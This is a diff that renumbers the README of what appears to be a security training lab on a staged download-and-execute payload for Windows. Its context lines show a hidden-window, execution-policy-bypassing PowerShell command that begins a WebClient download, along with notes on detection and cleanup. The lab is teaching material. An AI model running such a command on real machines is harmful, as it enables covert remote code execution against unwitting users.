@@ -1,4 +1,4 @@
-# Lab 05 — Staged Download-and-Execute
+# Lab 08 — Staged Download-and-Execute
 
 **Payload:** [payload.txt](payload.txt)
 **Target:** Windows 10/11, local (non-domain) machine, no elevation required
@@ -32,7 +32,7 @@ STRING powershell -NoP -NonI -W Hidden -Exec Bypass "..."
                    -NoP          : no PowerShell profile loaded (faster, quieter)
                    -NonI         : non-interactive
                    -W Hidden     : hidden window (no visible console this time,
-                                   unlike Lab 04)
+                                   unlike Lab 07)
                    -Exec Bypass  : ignore the execution policy for this process
 
                    IEX (New-Object System.Net.WebClient).DownloadFile(
@@ -87,5 +87,5 @@ It checks for:
 ## Cleanup
 
 See [cleanup.ps1](cleanup.ps1) — this one's fully reversible (unlike
-Lab 04's ACL changes), but a snapshot revert is still the cleanest reset
+Lab 07's ACL changes), but a snapshot revert is still the cleanest reset
 between runs.
